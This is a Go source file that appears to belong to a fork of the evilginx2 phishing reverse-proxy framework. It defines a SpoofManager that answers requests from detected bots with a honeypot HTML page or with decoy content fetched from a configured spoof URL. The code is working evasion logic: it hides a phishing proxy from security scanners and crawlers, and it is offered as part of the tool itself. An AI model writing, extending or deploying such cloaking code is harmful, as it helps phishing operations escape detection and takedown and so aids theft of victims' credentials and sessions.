package response

import (
	"io/ioutil"
	"net/http"

	"github.com/elazarl/goproxy"
	"github.com/kgretzky/evilginx2/log"
)

// SpoofManager handles generating spoofed and honeypot responses for detected bots
type SpoofManager struct {
	spoofUrl      string
	honeypotHTML  string
}

// NewSpoofManager creates a new spoof response manager
func NewSpoofManager(spoofUrl string, honeypotHTML string) *SpoofManager {
	return &SpoofManager{
		spoofUrl:     spoofUrl,
		honeypotHTML: honeypotHTML,
	}
}

// SetSpoofUrl updates the spoof URL
func (sm *SpoofManager) SetSpoofUrl(url string) {
	sm.spoofUrl = url
}

// SetHoneypotHTML updates the honeypot HTML response
func (sm *SpoofManager) SetHoneypotHTML(html string) {
	sm.honeypotHTML = html
}

// ServeSpoofResponse generates an HTTP response based on the configured spoof URL or honeypot
func (sm *SpoofManager) ServeSpoofResponse(req *http.Request) (*http.Request, *http.Response) {
	// If a specific honeypot HTML is configured, use it directly (useful for aggressive bot trapping)
	if sm.honeypotHTML != "" {
		return req, goproxy.NewResponse(req, "text/html", http.StatusOK, sm.honeypotHTML)
	}

	// Default to Spoof URL fetching
	if sm.spoofUrl == "" {
		return req, goproxy.NewResponse(req, "text/plain", http.StatusNotFound, "Not Found")
	}

	// Fetch spoof content
	resp, err := http.Get(sm.spoofUrl)
	if err != nil {
		log.Error("Failed to fetch spoof content: %v", err)
		return req, goproxy.NewResponse(req, "text/plain", http.StatusNotFound, "Not Found")
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Error("Failed to read spoof content: %v", err)
		return req, goproxy.NewResponse(req, "text/plain", http.StatusNotFound, "Not Found")
	}

	// Create response with spoofed content
	contentType := resp.Header.Get("Content-Type")
	if contentType == "" {
		contentType = "text/html"
	}

	return req, goproxy.NewResponse(req, contentType, http.StatusOK, string(body))
}
